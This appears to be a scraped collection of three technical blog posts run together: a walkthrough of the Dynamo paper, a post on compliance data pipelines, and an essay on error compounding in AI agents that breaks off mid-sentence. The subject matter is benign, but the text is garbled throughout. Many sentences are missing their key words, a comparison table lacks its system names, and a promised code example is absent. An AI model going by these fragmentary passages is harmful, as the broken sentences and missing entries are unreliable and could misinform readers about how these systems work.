new write has “seen” all the concurrent versions, so the conflict is resolved. Without this context, Dynamo might think it’s  concurrent write on top of the still-unresolved conflict.</p><h2>Merkle Trees for Anti-Entropy</h2><h3>The Problem: How Do You Know When Replicas Are Out of Sync?</h3><p>After a node recovers from a failure, it may have missed some writes. After a network partition heals, two replicas might diverge. How does Dynamo detect and fix these differences?</p><p>The brute-force approach would be: “Every hour, compare every key on Node A against Node B, and sync anything that’s different.” But at Amazon’s scale, a single node might store hundreds of millions of keys. Comparing them all one by one would be so slow and bandwidth-intensive that it would interfere with normal traffic.</p><p><strong>Dynamo uses Merkle trees to solve this efficiently.</strong> The core idea: instead of comparing individual keys, compare . If the hash matches, that whole group is identical—skip it. Only drill down into groups where hashes differ.</p><blockquote><p>: Merkle tree sync is a  mechanism. It’s not on the hot read/write path. Normal reads and writes use vector clocks and quorums for versioning. Merkle trees are for the repair process that runs periodically in the background to catch any inconsistencies that slipped through.</p></blockquote><h3>How a Merkle Tree Is Built</h3><p>Each node builds a Merkle tree over its data, organized by key ranges:</p><ol><li><p> contain the hash of a small range of actual data keys (e.g., hash of all values for keys k1, k2, k3).</p></li><li><p> contain the hash of their children’s hashes.</p></li><li><p> is a single hash representing  the data on the node.</p></li></ol><h3>How Two Nodes Sync Using Merkle Trees</h3><p>When Node A and Node B want to check if they’re in sync:</p><p>: Compare root hashes. If they’re the same, everything is identical. Done! (No network traffic for the data itself.)</p><p>: If roots differ, compare their left children. Same? Skip that entire half of the key space.</p><p>: Keep descending only into subtrees where hashes differ, until you reach the leaf nodes.</p><p>: Sync only the specific keys in the differing leaf nodes.</p><pre><code>Example: Comparing two nodes\n\nNode A root: abc789  ← differs from Node B!\nNode B root: abc788\n\nCompare left subtrees:\n  Node A left:  xyz123\n  Node B left:  xyz123  ← same! Skip entire left half.\n\nCompare right subtrees:\n  Node A right: def456\n  Node B right: def457  ← differs! Go deeper.\n\nCompare right-left subtree:\n  Node A right-left: ghi111\n  Node B right-left: ghi111  ← same! Skip.\n\nCompare right-right subtree:\n  Node A right-right: jkl222\n  Node B right-right: jkl333  ← differs! These are leaves.\n\n→ Sync only the keys in the right-right leaf range (e.g., k10, k11, k12)\n  Instead of comparing all 1 million keys, we compared 6 hashes\n  and synced only 3 keys!\n</code></pre><p><strong>Synchronization process in code</strong>:</p><pre><code>def sync_replicas(node_a, node_b, key_range):\n    \"\"\"\n    Efficiently sync two nodes using Merkle trees.\n    Instead of comparing all keys, we compare hashes top-down.\n    Only the ranges where hashes differ need actual key-level sync.\n    \"\"\"\n    tree_a = node_a.get_merkle_tree(key_range)\n    tree_b = node_b.get_merkle_tree(key_range)\n\n    # Step 1: Compare root hashes first.\n    # If they match, every key in this range is identical — nothing to do!\n    if tree_a.root_hash == tree_b.root_hash:\n        return  # Zero data transferred — full match!\n\n    # Step 2: Recursively find differences by traversing top-down.\n    # Only descend into subtrees where hashes differ.\n    differences = []\n    stack = [(tree_a.root, tree_b.root)]\n\n    while stack:\n        node_a_subtree, node_b_subtree = stack.pop()\n\n        if node_a_subtree.hash == node_b_subtree.hash:\n            continue  # This whole subtree matches — skip it!\n\n        if node_a_subtree.is_leaf:\n            # Found a differing leaf — these keys need syncing\n            differences.extend(node_a_subtree.keys)\n        else:\n            # Not a leaf yet — recurse into children\n            for child_a, child_b in zip(node_a_subtree.children, node_b_subtree.children):\n                stack.append((child_a, child_b))\n\n    # Step 3: Sync only the specific keys that differed at leaf level.\n    # This might be a handful of keys, not millions.\n    for key in differences:\n        sync_key(node_a, node_b, key)\n</code></pre><p>The power of Merkle trees is that the number of hash comparisons you need scales with the  (logarithmic in the number of keys), not the number of keys themselves.</p><pre><code>Node with 1,000,000 keys:\n\nNaive approach:  Compare 1,000,000 keys individually\n                 Cost: 1,000,000 comparisons\n\nMerkle tree:     Compare O(log N) hashes top-down\n                 Tree depth ≈ 20 levels\n                 Cost: 20 comparisons to find differences\n                 Then sync only the differing leaves (~few keys)\n\nSpeedup: ~50,000x fewer comparisons!\n</code></pre><p>And critically, if two nodes are  (which is almost always true in a healthy cluster), the root hashes often match entirely and zero data needs to be transferred. The anti-entropy process is very cheap in the common case.</p><h2>Membership and Failure Detection</h2><p>Dynamo uses a gossip protocol for membership management. Each node periodically exchanges membership information with random peers. There is no master node—all coordination is fully decentralized.</p><p>: Every node maintains its own view of cluster membership. There’s no central registry, so there’s no single point of failure for membership data.</p><p><strong>Failure suspicion vs. detection</strong>: Dynamo uses an accrual-based failure detector (similar to Phi Accrual). Rather than a binary “alive/dead” judgment, nodes maintain a  that rises the longer a peer is unresponsive. This avoids false positives from transient network hiccups.</p><pre><code>Node A's view of Node B:\n- Last heartbeat: 3 seconds ago → Suspicion low → Healthy\n- Last heartbeat: 15 seconds ago → Suspicion rising → Likely slow/degraded\n- Last heartbeat: 60 seconds ago → Suspicion high → Treat as failed\n</code></pre><p><strong>Decentralized bootstrapping</strong>: New nodes contact a seed node to join, then gossip spreads their presence to the rest of the cluster. Ring membership is eventually consistent—different nodes may have slightly different views of the ring momentarily, which is acceptable.</p><p>The paper provides fascinating performance data. Let me break it down:</p><pre><code>Metric              | Average | 99.9th Percentile\n--------------------|---------|------------------\nRead latency        | ~10ms   | ~200ms\nWrite latency       | ~15ms   | ~200ms\n\nKey insight: 99.9th percentile is ~20x the average!\n</code></pre><p> The 99.9th percentile is affected by:</p><ul><li>Garbage collection pauses</li></ul><p>This is why Amazon SLAs are specified at 99.9th percentile, not average.</p><p>From 24 hours of Amazon’s production shopping cart traffic (per the Dynamo paper). Note these reflect Amazon’s specific workload characteristics, not a universal baseline:</p><pre><code>99.94%    - Saw exactly one version (no conflict)\n0.00057%  - Saw 2 versions\n0.00047%  - Saw 3 versions  \n0.00009%  - Saw 4 versions\n</code></pre><p>: Conflicts are rare in practice! Most often caused by concurrent writers (robots), not failures.</p><h2>Partitioning Strategy Evolution</h2><p>Dynamo evolved through three partitioning strategies. This evolution teaches us important lessons:</p><h3>Strategy 1: Random Tokens (Initial)</h3><pre><code>Problem: Random token assignment → uneven load\nProblem: Adding nodes → expensive data scans\nProblem: Can't easily snapshot the system\n</code></pre><p>: Random token assignment sounds elegant but is a nightmare in practice. Each node gets a random position on the ring, which means wildly different data ownership ranges and uneven load distribution.</p><h3>Strategy 2: Equal-sized Partitions + Random Tokens</h3><pre><code>Improvement: Decouples partitioning from placement\nProblem: Still has load balancing issues\n</code></pre><h3>Strategy 3: Q/S Tokens Per Node — Equal-sized Partitions + Deterministic Placement (Current)</h3><ul><li> = the total number of fixed partitions the ring is divided into (e.g. 1024).

Servers no longer get random positions — they each own exactly Q/S partitions, distributed evenly around the ring.</p><pre><code>Example: Q=12 partitions, S=3 servers\n\nRing divided into 12 equal slices (each covers 30° of the 360° ring):\n  Partition  1:   0°– 30°  → Server A\n  Partition  2:  30°– 60°  → Server B\n  Partition  3:  60°– 90°  → Server C\n  Partition  4:  90°–120°  → Server A\n  Partition  5: 120°–150°  → Server B\n  Partition  6: 150°–180°  → Server C\n  ...and so on, round-robin\n\nEach server owns exactly Q/S = 12/3 = 4 partitions → perfectly balanced.\n\nWhen a 4th server joins (S becomes 4):\n  New Q/S = 12/4 = 3 partitions per server.\n  Each existing server hands off 1 partition to the new server.\n  Only 3 out of 12 partitions move — the rest are untouched.\n</code></pre><p>This evolution — from random tokens to fixed, equal-sized partitions with balanced ownership — is one of the most instructive operational learnings from Dynamo. The early approach prioritized simplicity of implementation; the later approach prioritized operational simplicity and predictability.</p><p>| System | Consistency Model | Use Case | Dynamo Influence |\n|----|----|----|----|\n|  | Tunable (N, R, W) | Time-series, analytics | Direct descendant — heavily inspired by Dynamo, uses same consistent hashing and quorum concepts |\n|  | Tunable, vector clocks | Key-value store | Closest faithful Dynamo implementation |\n|  | Eventually consistent by default | Managed NoSQL | <strong>⚠️&nbsp;Not the same as Dynamo!</strong>&nbsp;DynamoDB is a completely different system internally, with no vector clocks and much simpler conflict resolution.

They are very different. DynamoDB is a managed service optimized for operational simplicity. It does not expose vector clocks, does not use the same partitioning scheme, and uses a proprietary consistency model. The paper is about the internal Dynamo storage engine that predates DynamoDB.</p></blockquote><h2>What Dynamo Does NOT Give You</h2><p>Every senior engineer blog should be honest about limitations. Here’s what Dynamo explicitly trades away:</p><ul><li>: Operations are single-key only. You can’t atomically update multiple keys.</li><li>: You can only look up data by its primary key (at least in the original design).</li><li>: It’s a key-value store. There is no query language.</li><li>: Events across different keys have no guaranteed ordering.</li><li>: Even at R=W=N, Dynamo does not provide linearizable reads. There is no global clock, no strict serializability.</li><li><strong>No automatic conflict resolution</strong>: The system detects conflicts and surfaces them to the application. The  must resolve them. If your engineers don’t understand this, you will have subtle data bugs.</li><li>: The anti-entropy process (Merkle tree reconciliation) is not free. At large scale, background repair traffic can be significant.</li><li>: In high-churn write environments with many coordinators, vector clocks can grow large enough to require truncation, which introduces potential causality loss.</li></ul><p>Understanding these limitations is critical to successfully operating Dynamo-style systems in production.</p><h2>Practical Implementation Example</h2><p>Below is a self-contained Python implementation of the core Dynamo concepts. It’s intentionally simplified—no actual networking, no persistence—but it faithfully models how vector clocks, the consistent hash ring, quorum reads/writes, and conflict detection interact.

Users will tolerate seeing slightly stale data. They won’t tolerate “Service Unavailable.”</p><h3>2. <strong>Application-Level Reconciliation is Powerful</strong></h3><p>Don’t be afraid to push conflict resolution to the application. The application understands the business logic and can make smarter decisions than the database ever could.</p><h3>3. <strong>Tunable Consistency is Essential</strong></h3><p>One size doesn’t fit all. Shopping cart additions need high availability (W=1). Financial transactions need stronger guarantees (W=N). The ability to tune this per-operation is incredibly valuable.</p><h3>4. <strong>The 99.9th Percentile Matters More Than Average</strong></h3><p>Focus your optimization efforts on tail latencies. That’s what users actually experience during peak times.</p><h3>5. <strong>Gossip Protocols Scale Beautifully</strong></h3><p>Decentralized coordination via gossip eliminates single points of failure and scales to thousands of nodes.</p><h2>When NOT to Use Dynamo-Style Systems</h2><p>Be honest about trade-offs. Don’t use this approach when:</p><ul><li><strong>Strong consistency is required</strong> (financial transactions, inventory management)</li><li><strong>Complex queries are needed</strong> (reporting, analytics, joins)</li><li><strong>Transactions span multiple items</strong> (Dynamo is single-key operations only)</li><li><strong>Your team can’t handle eventual consistency</strong> (if developers don’t understand vector clocks and conflict resolution, you’ll have problems)</li></ul><p>Dynamo represents a fundamental shift in how we think about distributed systems. By embracing eventual consistency and providing tunable trade-offs, it enables building systems that scale to massive sizes while maintaining high availability.</p><p>The paper’s lessons have influenced an entire generation of distributed databases. Whether you’re using Cassandra, Riak, or DynamoDB, you’re benefiting from the insights first published in this paper.</p><p>As engineers, our job is to understand these trade-offs deeply and apply them appropriately. Dynamo gives us a powerful tool, but like any tool, it’s only as good as our understanding of when and how to use it.</p><ul><li>Cassandra Documentation: Understanding how these concepts are implemented</li><li>“Designing Data-Intensive Applications” by Martin Kleppmann – Chapter 5 on Replication</li></ul><h2>Appendix: Design Problems and Approaches</h2><p>Three open-ended problems that come up in system design interviews and real engineering work. Think through each before reading the discussion.</p><h3>Problem 1: Conflict Resolution for a Collaborative Document Editor</h3><p>: You’re building something like Google Docs backed by a Dynamo-style store. Two users edit the same paragraph simultaneously. How do you handle the conflict?</p><p><strong>Why shopping cart union doesn’t work here</strong>: The shopping cart strategy (union of all items) is only safe because adding items is commutative — . Text editing is not commutative. If User A deletes a sentence and User B edits the middle of it, the union of their changes is meaningless or contradictory.</p><p><strong>The right approach: Operational Transformation (OT) or CRDTs</strong></p><p>The industry solution is to represent the document not as a blob of text, but as a sequence of operations, and to transform concurrent operations so they can both be applied without conflict:</p><pre><code>User A's operation: delete(position=50, length=20)\nUser B's operation: insert(position=60, text=\"new sentence\")\n\nWithout OT: B's insert position (60) is now wrong because A deleted 20 chars.\nWith OT:    Transform B's operation against A's:\n            B's insert position shifts to 40 (60 - 20).\n            Both operations now apply cleanly.\n</code></pre><p>The conflict resolution strategy for the Dynamo layer would be:</p><ul><li>Store operations (not full document snapshots) as the value for each key.</li><li>On conflict, collect all concurrent operation lists from each version.</li><li>Apply OT to merge them into a single consistent operation log.</li><li>Write the merged log back with the merged vector clock as context.</li></ul><p>: The operation log per document segment, not the rendered text. This makes merges deterministic and lossless.</p><p>: This is essentially how Google Docs, Notion, and Figma work. Their storage layers use either OT or a variant of CRDTs (Conflict-free Replicated Data Types), which are data structures mathematically guaranteed to merge without conflicts regardless of operation ordering.</p><h3>Problem 2: Choosing N, R, W for Different Use Cases</h3><p>: What configuration would you pick for (a) a session store, (b) a product catalog, (c) user profiles?</p><p>The right way to think about this: identify the failure mode that costs more — a missed write (data loss) or a rejected write (unavailability). Then pick quorum values accordingly.</p><p><strong>Session store — prioritize availability</strong></p><p>Sessions are temporary and user-specific. If a user’s session is briefly stale or lost, they get logged out and log back in. That’s annoying but not catastrophic. You never want to reject a session write.</p><pre><code>N=3, R=1, W=1\n\nRationale:\n- W=1: Accept session writes even during heavy failures.\n        A user can't log in if their session write is rejected.\n- R=1: Read from any single node. Stale session data is harmless.\n- N=3: Still replicate to 3 nodes for basic durability.\n\nTrade-off accepted: Stale session reads are possible but inconsequential.\n</code></pre><p><strong>Product catalog — prioritize read performance and consistency</strong></p><p>Product data is written rarely (by ops teams) but read millions of times per day. Stale prices or descriptions are problematic. You want fast, consistent reads.</p><pre><code>N=3, R=2, W=3\n\nRationale:\n- W=3: All replicas must confirm a catalog update before it's live.\n        A price change half-published is worse than a brief write delay.\n- R=2: Read quorum overlap with W=3 guarantees fresh data.\n        Acceptable: catalog writes are rare, so write latency doesn't matter.\n- N=3: Standard replication for durability.\n\nTrade-off accepted: Writes are slow and fail if any node is down.\n                    Acceptable because catalog updates are infrequent.\n</code></pre><p>Profile data (name, email, preferences) is moderately important. A stale profile is annoying but not dangerous. A rejected update (e.g., user can’t update their email) is a real problem.</p><pre><code>N=3, R=2, W=2\n\nRationale:\n- The classic balanced configuration.\n- R + W = 4 &gt; N = 3, so quorums overlap: reads will see the latest write.\n- Tolerates 1 node failure for both reads and writes.\n- Appropriate for data that matters but doesn't require strict consistency.\n\nTrade-off accepted: A second simultaneous node failure will cause errors.\n                    Acceptable for non-critical user data.\n</code></pre><p><strong>Decision framework summary:</strong></p><p>| Priority | R | W | When to use |\n|----|----|----|----|\n| Max availability | 1 | 1 | Sessions, ephemeral state, click tracking |\n| Balanced | 2 | 2 | User profiles, preferences, soft state |\n| Consistent reads | 2 | 3 | Catalogs, config, rarely-written reference data |\n| Highest consistency | 3 | 3 | Anywhere you need R+W &gt; N with zero tolerance for stale reads (still not linearizable) |</p><h3>Problem 3: Testing a Dynamo-Style System Under Partition Scenarios</h3><p>: How do you verify that your system actually behaves correctly when nodes fail and partitions occur?</p><p>This is one of the hardest problems in distributed systems testing because the bugs only appear in specific interleavings of concurrent events that are difficult to reproduce deterministically.</p><p><strong>Layer 1: Unit tests for the logic in isolation</strong></p><p>Before testing distributed behavior, verify the building blocks independently. Vector clock comparison logic, conflict detection, and reconciliation functions can all be tested with pure unit tests — no networking needed.</p><pre><code>def test_concurrent_clocks_detected_as_conflict():\n    clock_a = VectorClock({\"node-A\": 2})\n    clock_b = VectorClock({\"node-B\": 2})\n    assert not clock_a.dominates(clock_b)\n    assert not clock_b.dominates(clock_a)\n    # Both survive reconciliation → conflict correctly detected\n\ndef test_ancestor_clock_is_discarded():\n    old_clock = VectorClock({\"node-A\": 1})\n    new_clock = VectorClock({\"node-A\": 3})\n    assert new_clock.dominates(old_clock)\n    # old_clock should be pruned during reconciliation\n</code></pre><p><strong>Layer 2: Deterministic fault injection</strong></p><p>Rather than hoping failures happen in the right order during load testing, inject them deliberately and repeatably. In the demo implementation above,  is a simple version of this. In production systems, libraries like <a href=\"https://jepsen.io/\">Jepsen</a> or <a href=\"https://netflix.github.io/chaosmonkey/\">Chaos Monkey</a> do this at the infrastructure level.</p><pre><code>Scenario A: Write succeeds with W=2, third replica is down.\n  → Verify: the data is readable after the down node recovers.\n  → Verify: no data loss occurred.\n\nScenario B: Two nodes accept concurrent writes to the same key.\n  → Verify: the next read surfaces exactly 2 conflicting versions.\n  → Verify: after the application writes a merged version, the next read is clean.\n\nScenario C: Node goes down mid-write (wrote to W-1 nodes).\n  → Verify: the write is correctly rejected (RuntimeError).\n  → Verify: no partial writes are visible to readers.\n\nScenario D: All N nodes recover after a full partition.\n  → Verify: no data was lost across the cluster.\n  → Verify: vector clocks are still meaningful (no spurious conflicts).\n</code></pre><p><strong>Layer 3: Property-based testing</strong></p><p>Instead of writing individual test cases, define  that must always hold and generate thousands of random operation sequences to try to violate them:</p><pre><code># Invariant: after any sequence of writes and merges, a final get()\n# should always return exactly one version (no unresolved conflicts).\n\n# Invariant: a value written with a context derived from a previous read\n# should never produce a conflict with that read's version\n# (it should dominate it).\n\n# Invariant: if R + W &gt; N, a value written successfully should always\n# be visible in the next read (read-your-writes, absent concurrent writes).\n</code></pre><p>Tools like <a href=\"https://hypothesis.readthedocs.io/\">Hypothesis</a> (Python) let you express these invariants and automatically find counterexamples.</p><p><strong>Layer 4: Linearizability checkers</strong></p><p>For the highest confidence, record every operation’s start time, end time, and result during a fault injection test, then feed the history to a linearizability checker like <a href=\"https://github.com/jepsen-io/knossos\">Knossos</a>. It will tell you whether any observed history is consistent with a correct sequential execution — even for an eventually-consistent system operating within its stated guarantees.</p><p><em>Written from the trenches of distributed systems.

      "content": "<p>If you've ever built a data pipeline for analytics or business intelligence, you know the basics — ingest, transform, store. But regulated industries are a different game entirely. A missed record in a BI pipeline means a slightly off dashboard. A missed record in a compliance pipeline means a regulatory fine, a failed audit, or worse.</p><p>Over the past couple of years, I've been designing and running ETL pipelines that process over 500,000 compliance data files every month from more than 25 data providers — emails, instant messages, voice recordings, video recordings, and mobile communications. Every single record needs to be ingested, parsed, normalized, and stored with a full audit trail. No exceptions.</p><p>Along the way, I've made plenty of mistakes and discovered patterns that actually work at this scale. Here's what I've learned.</p><h2>The Problem: Chaos In, Order Out</h2><p>Here's the reality no one warns you about: no two data providers behave the same way. Some push files via SFTP on a schedule. Others drop them into S3 buckets through event triggers. Some send nicely structured JSON. For some sources, you have to build pullers. Others send multi-gigabyte XML files with schemas that are barely documented — if at all. And every once in a while, a provider changes their format without telling anyone.</p><p>Now here's the fun part. Regulations like <a href=\"https://www.finra.org/rules-guidance/guidance/interpretations-financial-operational-rules/sea-rule-17a-4-and-related-interpretations\">SEC Rule 17a-4</a> couldn't care less about your provider's quirks. Every record must be captured completely, stored immutably, and traceable from source to storage.</p><p>That gap between messy inputs and strict rules? That's where all the interesting engineering lives.</p><h2>How We Structured It: A Three-Stage Pipeline</h2><p>After a lot of trial and error, we landed on a three-stage architecture:</p><pre><code>File Upload → EventBridge → Parser (Stage 1)\n                                ↓\n                         Canonical Store (MongoDB)\n                                ↓\n                         Processor (Stage 2)\n                                ↓\n                     Alerts + Audit Trail + Retention\n                                ↓\n                         Export (Stage 3, on-demand)\n</code></pre><p> orchestrate everything. Each source type gets its own state machine — workflow, retries, error handling — all defined in declarative YAML. Want to change the retry count from 3 to 5? That's a config change, not a deployment.</p><p>This separation turned out to be crucial. Parsing is a different problem from processing, which is a different problem from exporting. Mixing them creates a mess that's impossible to debug at 3 AM when something breaks.</p><h2>The Generic Parser: From Weeks to Days</h2><p>Early on, we built custom parsers for every data provider. Each one was a snowflake — different structure, different assumptions, different bugs. Adding a new provider meant 3-4 weeks of custom work. That doesn't scale when you're integrating 25+ sources.</p><p>The fix was surprisingly simple: define two interfaces and make everything implement them.</p><pre><code>interface IParserService {\n  parse(input: RawInput): AsyncIterable&lt;BaseParsedData&gt;;\n}\n\ninterface IProcessingService {\n  process(data: BaseParsedData[]): Promise&lt;ProcessedResult&gt;;\n}\n</code></pre><p>Each data source plugs in its own implementation via dependency injection. The pipeline doesn't care whether it's parsing XML, JSON, or EML — it calls , gets back normalized records, and moves on.</p><p>After making this switch, new integrations dropped to about 100 lines of transformer code and 3-5 days of work. That's the difference between supporting 5 providers and supporting 25+.</p><p>The principle is simple: <strong>standardize the interface, not the source.</strong> You'll never get providers to send data in a consistent format. But you can absolutely control how your system consumes it.</p><h2>One Schema to Rule Them All</h2><p>With 25+ source types, you need a single internal representation. Otherwise, every downstream system has to understand every source format — and that's a maintenance nightmare.</p><p>We went with a type hierarchy:</p><pre><code>interface IBaseParsedData {\n  originId: string;         // Unique ID from source\n  content: string;          // Raw content\n  contentText: string;      // Plain text extraction\n  originalTimestamp: number; // Epoch ms\n  sourceKey: string;        // Original file location\n  type: MessageType;        // EMAIL | IM | VOICE | SMS | ...\n}\n</code></pre><p>Specialized types extend the base. Instant messages have threading and participant fields. Email has distribution lists and attachments. Voice recordings have timestamps and speaker attribution. Downstream processors can work with the base type for generic operations — retention, audit trail creation — and narrow to a specific type only when they actually need source-specific fields.</p><p>One rule we enforce strictly: <strong>never throw away source-specific data.</strong> If a provider sends a field that doesn't map to our canonical model, we preserve it in the raw output anyway. Sometimes auditors ask unpredictable questions, and they ask them years after the data was ingested. \"Sorry, we discarded that field\" is not an acceptable answer.</p><h2>Streaming: Because 4GB Files Won't Fit in Memory</h2><p>Here's a problem you don't encounter until you hit a certain scale. Some providers deliver batch files that are multiple gigabytes in size. Try loading a 4GB XML file into a Lambda function's memory and see what happens. (Spoiler: nothing good.)</p><p>We needed constant memory usage regardless of file size. The answer was  — all the way through.</p><pre><code>async function* parseSourceFile(\n  s3Stream: ReadableStream\n): AsyncIterable&lt;IBaseParsedData&gt; {\n  const parser = createStreamingParser();\n\n  for await (const chunk of s3Stream) {\n    parser.feed(chunk);\n    while (parser.hasCompleteRecord()) {\n      yield normalize(parser.nextRecord());\n    }\n  }\n}\n</code></pre><p>The parser yields records one at a time as it reads the file. The downstream processor accumulates them into chunks of 500, flushes to MongoDB, and moves on. At no point does the full file exist in memory. The footprint stays constant: one chunk plus the parser buffer, no matter how big the file is.</p><p>We also set hard ceilings — 2GB for parser text buffers, 200MB for processor chunks. When the limit is hit, the pipeline halts with a clear error instead of quietly dying from an OOM crash.</p><h2>When Node.js Isn't Fast Enough</h2><p>Several of our parsers handled deeply nested XML files with hundreds of thousands of records. The Node.js implementation worked fine for small files. But on large exports, it was spending more than several hours on files that needed to finish in minutes to meet SLAs.</p><p>So we decided to experiment: we rewrote those parsers in Rust.</p><p>The Rust version uses the  crate with async streaming, compiled to a native Lambda binary. The outcome is  What used to take 2 hours now finishes in under 15 seconds.</p><p>Here's the important part — we didn't rewrite the whole pipeline in Rust. That would've been overkill. We identified the single compute-bound bottleneck, rewrote that component, and plugged it back in through Step Functions. The Rust Lambda processes the file and writes normalized output. The rest of the TypeScript pipeline consumes it normally, completely unaware that anything changed upstream.</p><p>TypeScript is great for business logic and orchestration, but Rust is great for making a parser go much faster.</p><h2>Concurrency: MongoDB as a Distributed Throttle</h2><p>When multiple sources are triggering the pipeline simultaneously, they can overload it.</p><p>The obvious solution is Redis or a dedicated queue. But we already had MongoDB Atlas as our primary data store, and we didn't want to add another service to monitor and maintain. So we came up with an idea:</p><pre><code>async function tryAcquireSlot(\n  runId: string,\n  type: 'Parser' | 'Processor'\n): Promise&lt;boolean&gt; {\n  const result = await ThrottlingList.findOneAndUpdate(\n    {\n      type,\n      $expr: { $lt: [{ $size: '$runIds' }, MAX_CONCURRENT_RUNS] }\n    },\n    { $addToSet: { runIds: runId } },\n    { new: true }\n  );\n  return result !== null;\n}\n</code></pre><p>MongoDB's  is atomic — it checks capacity and reserves a slot in a single operation without any race conditions. If the list is full, the Step Function enters a wait state with exponential backoff and retries until a slot opens.</p><p>This is probably not a \"proper\" way to do concurrency control, but when you are short of resources, you have to get creative. For our use case, there were tens of concurrent runs, not thousands. So, we decided to try it out. It worked pretty well and kept the operational footprint simple. Sometimes the pragmatic solution beats the textbook one.</p><h2>Tiered Storage: Cutting Costs by 40%</h2><p>At 500K files per month, storage costs grow quickly. We split data across access tiers:</p><ul><li>: Standard S3 for anything under 90 days old. Fast retrieval for daily compliance work.</li><li>: Automatic lifecycle transition to Glacier Instant Retrieval for older data. <a href=\"https://www.finra.org/rules-guidance/guidance/interpretations-financial-operational-rules/sea-rule-17a-4-and-related-interpretations\">SEC 17a-4</a> can require 3-7 years of retention — Glacier handles this at a fraction of standard storage cost.</li></ul><p>The result: <strong>~40% reduction in storage costs</strong>, with zero impact on compliance. Most queries hit recent data anyway. The stuff from two years ago only gets touched during audits.</p><p>Here's what I keep seeing across regulated industries: most organizations don't have a unified pipeline. They have 5-10 disconnected tools — one for email, one for chat, one for voice, one for reporting. Compliance officers spend their time manually exporting from each system, reformatting in spreadsheets, and cross-referencing by hand.</p><p>About 77% of compliance teams still rely on manual processes. Only 1.6% of firms have fully integrated AI into their compliance workflows. At the same time, regulatory compliance runs U.S. businesses an estimated $2.155 trillion annually.</p><p>The generic parser pattern I've described isn't just an engineering convenience — it's a way to solve this fragmentation. Compliance teams are getting a unified view through a single interface rather than stitching together five different exports.</p><p>This matters especially for mid-sized firms, where compliance costs per employee run about 40% higher than at large enterprises. They can't afford ten specialized tools. A unified pipeline gives them comprehensive coverage without the cost and operational overhead.</p><h2>What I'd Tell Someone Starting From Scratch</h2><p>After several years of doing this, here's what I keep coming back to:</p><ol><li><strong>Standardize the interface, not the source.</strong> Build pluggable parsers. New sources should take days, not weeks.</li><li> If your pipeline loads entire files into memory, it will break at scale. Async iterables keep your footprint constant.</li><li><strong>Pick the right language for the bottleneck.</strong> TypeScript for logic and orchestration. Rust or C++ for the hot path. A major speedup on one parser can improve your entire system.</li><li><strong>Never silently drop data.</strong> Halt, alert, and let a human decide. A known gap is infinitely better than an invisible one.</li><li><strong>Design for the regulatory clock, not just the technical SLA.</strong> Your pipeline needs to be fast enough to meet compliance deadlines, and you need monitoring that can prove it.</li></ol>",

      "content": "<p>The pattern is becoming familiar across the industry. Teams build impressive AI agent demos, often coding copilots, research assistants, or internal automation tools. Leadership gets excited. Resources get allocated. Expectations rise.</p><p>Six months later, the project is either quietly shelved or operating with so much human oversight that it would have been faster to build a traditional workflow.</p><p>What makes this frustrating is that the teams involved are rarely inexperienced. The engineers are competent. The models are capable. The architecture looks reasonable in design reviews. Yet something that appeared reliable in a controlled demo begins failing unpredictably under real production traffic.</p><p>Practitioner evidence points to the same underlying cause. The issue plaguing AI agent deployment is not prompt quality or model intelligence. It is a failure to account for basic probability in multi-step systems.</p><p>Industry data reinforces this gap. The 2026 LangChain State of Agent Engineering report found that 57 percent of surveyed organizations run agents in production, up from 51 percent one year prior, with quality cited as the top barrier to production. Leading coding agents scoring around 74 percent on SWE-bench Verified benchmarks signal progress, but still fall short of production-grade consistency.</p><p>The gap between demos and production is not about prompts or models.</p><p>It is about compounding errors, and most agent architectures are designed as if this math does not exist.</p><h2>The Math Behind AI Agent Failures</h2><p>A commonly overlooked system’s property shapes agent reliability. Reliability does not remain constant as steps increase. It compounds downward.</p><p>If each step in your agent succeeds 90 percent of the time, chaining five steps does not give you 90 percent reliability. It gives you 59 percent.</p><p>Sequential systems multiply success probabilities. Each step depends on the success of the previous one. A single failure breaks the end result.</p><p>Mathematically, 0.9 raised to the power of five equals 0.59. A system that appears 90 percent accurate at the step level becomes close to a coin flip at the workflow level.</p><p>The numbers deteriorate quickly as steps increase.</p><p>| Steps | 95% per step | 90% per step | 85% per step |\n|----|----|----|----|\n| 3 | 86% | 73% | 61% |\n| 5 | 77% | 59% | 44% |\n| 10 | 60% | 35% | 20% |\n| 20 | 36% | 12% | 4% |</p><p>This becomes clearer in real agent workflows.</p><p>Consider a customer support agent resolving a billing dispute. It must read the ticket, retrieve customer history, identify the root cause across multiple systems, determine policy applicability, calculate adjustments, draft an explanation, and coordinate with fulfillment. Even conservative estimates place this at 15 to 30 decision points.</p><p>At 90 percent accuracy across 20 steps, end-to-end success drops to roughly 12 percent.</p><p>Honeycomb, an observability platform company, documented similar degradation while building their query assistant. Chained model calls multiplied failure modes. Each call introduced new opportunities for misinterpretation, context drift, and reasoning loss.</p><p>This explains why demos create a misleading readiness signal.</p><p>Demo scenarios are curated. Workflows are shorter. Edge cases are avoided. Under these conditions, compounded probability remains tolerable.</p><p>Production environments are different. Real users bring ambiguity, incomplete context, and long-horizon tasks. As step counts rise, compounded error dominates outcomes.</p><p>This is the structural reliability gap between demos and production. It is a systems math problem.</p><p>Once teams recognize this pattern, the instinct is to add safeguards inside the agent. Reflection loops, critique passes, and retries attempt to counteract error propagation.</p><p>In theory, this should help. In practice, evidence suggests otherwise.</p><h2>Why AI Agent Self-Correction Fails</h2><p>Self-correction attempts to contain compounded error internally. Research and production experience suggest it remains unreliable without external feedback.</p><p>An ICLR 2024 study titled <em>Large Language Models Cannot Self-Correct Reasoning Yet</em> found that models struggle to fix their own reasoning mistakes. In some cases, performance degraded after critique passes.</p><p>Follow-up research studying self-evolving agents reported similar patterns. Models misinterpreted prior experience and failed to transfer lessons reliably. Training analyses also observed that critique signals sometimes led models to mask flawed reasoning rather than resolve it.</p><p>The distinction becomes clearer operationally.</p><p>Self-correction works when external validation exists. External validation is any correctness signal originating outside the model’s reasoning.</p><p>Examples include code compilation, automated tests, schema validation, or API contract enforcement. In these cases, correctness is machine-verifiable.</p><p>Most agent decisions lack this property.</p><p>Selecting the right file. Interpreting user intent. Deciding whether to proceed or ask for clarification. These rely on internal judgment. The model is grading its own exam.</p><p>This is where confident failure emerges.</p><p>Prompt injection introduces a related structural risk. Because models process instructions and data in the same channel, malicious context can influence reasoning. As one security analysis put it, “Security requires boundaries, but LLMs dissolve boundaries.” Self-correction inherits this vulnerability.</p><p>Reliability, therefore, cannot depend on internal reflection alone. It must come from systems that validate outcomes externally.</p><p>If compounded errors cannot be neutralized internally, reliability must be introduced structurally.</p><p>Which leads to flow engineering.</p><h2>Flow Engineering Over Prompt Engineering</h2><p>If 